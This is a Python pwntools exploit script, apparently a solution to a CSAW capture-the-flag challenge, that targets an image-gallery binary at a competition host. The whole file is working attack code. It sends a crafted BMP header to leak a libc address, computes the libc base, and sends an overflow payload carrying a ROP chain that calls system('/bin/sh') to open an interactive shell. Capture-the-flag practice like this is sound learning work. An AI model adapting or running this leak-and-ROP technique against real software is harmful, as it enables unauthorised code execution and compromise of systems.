#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF('./galery_patched')
context.terminal = ['tmux', 'splitw', '-hb', '-F', '#\x7bpane_pid\x7d', '-P']
libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        # chals.ctf.csaw.io:30009
        io = remote('chals.ctf.csaw.io', 30009)
        # io = remote(args.HOST, args.PORT)
    elif args.GDB:
        gdbscript = """
            brva 0x1a65
            brva 0x1687
            del
            c
        """
        io = gdb.debug(['./galery_patched'], gdbscript=gdbscript)
    else:
        io = process(['./galery_patched'])
    return io

r = conn()

def upload(dat):
    r.sendlineafter(b'>', b'1')
    r.sendline(dat)

def copy():
    r.sendlineafter(b'>', b'2')

def show():
    r.sendlineafter(b'>', b'3')

def get_leak():
    payload = b'BM' + b'\x00' * 12 
    payload += p32(0) + p32(1) + p32(1) + p16(1) + p16(0x18) + b'\x00' * 16 + p32(0)

    upload(payload)
    copy()
    show()

    shown = r.recvline_contains(b'[').split(b', ')[5]
    # print(shown)
    return u64(shown)

# your solution here
leak = get_leak()
libc.address = leak - libc.sym['stdin'] + 0x1000 - 0x230
print(hex(libc.address))

payload = b'BM' + b'\x00' * 12 
payload += p32(0) + p32(1) + p32(1) + p16(1) + p16(0x18) + b'\x00' * 16 + p32(0x480//4)

payload += b'\x00' * 0x444

payload += b'A' * 8

rop = ROP(libc)
# rop.call(libc.sym['puts'], [libc.sym['stdin']])   
rop.call(rop.ret)
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
payload += rop.chain()

print(len(payload))
upload(payload)
copy()
# show()

r.interactive()
